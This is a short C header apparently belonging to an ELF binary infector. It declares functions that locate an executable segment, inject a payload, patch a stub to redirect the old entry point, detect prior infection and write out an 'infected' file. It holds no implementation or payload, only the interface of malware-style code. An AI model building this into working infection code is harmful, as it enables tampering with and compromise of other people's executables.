#ifndef ELF_INJECT_H
#define ELF_INJECT_H

#pragma once
#include "umbrella.h"

Elf64_Phdr *find_exec_segment(void *map, size_t mapsize);
void *get_exec_segment_ptr(void *map, ElfInfo *info);

unsigned char *save_original_text(unsigned char *text, size_t size);
int inject_payload(void *map, size_t mapsize, ElfInfo *info, unsigned char *payload, size_t payload_size, uint64_t *old_entry);

int write_infected_file(const char *output_path, void *map, size_t size);
int already_infected(void *map, ElfInfo *info);
void patch_stub(unsigned char *stub, size_t stub_size, uint64_t payload_rel_off, uint64_t payload_size, uint64_t old_entry_rel_off);

#endif
